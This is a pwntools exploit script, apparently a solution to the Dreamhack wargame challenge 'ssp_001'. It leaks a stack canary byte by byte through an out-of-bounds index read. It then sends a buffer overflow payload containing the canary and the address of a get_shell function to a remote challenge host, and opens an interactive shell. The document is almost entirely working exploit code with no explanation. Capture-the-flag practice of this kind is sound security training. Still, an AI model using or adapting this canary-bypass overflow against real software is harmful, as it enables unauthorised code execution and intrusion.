from pwn import *
#context.log_level = 'debug'
p=remote('host3.dreamhack.games', 24042)
e=ELF('./ssp_001')
canary = ''
get_shell = e.symbols['get_shell']

#canary leak
for i in range(131, 127, -1):
    p.sendafter('> ', 'P')
    p.sendlineafter('Element index : ', str(i))
    p.recvuntil(' : ')
    canary += p.recv(2)
canary = int(canary, 16)
log.info('[+]canary: 0x%x' %canary)

#exploit
payload = "A"*64
payload += p32(canary)
payload += "B"*8
payload += p32(get_shell)

p.sendafter('> ', 'E')
p.sendlineafter('Name Size : ', '200')
p.sendafter('Name : ', payload)
p.interactive()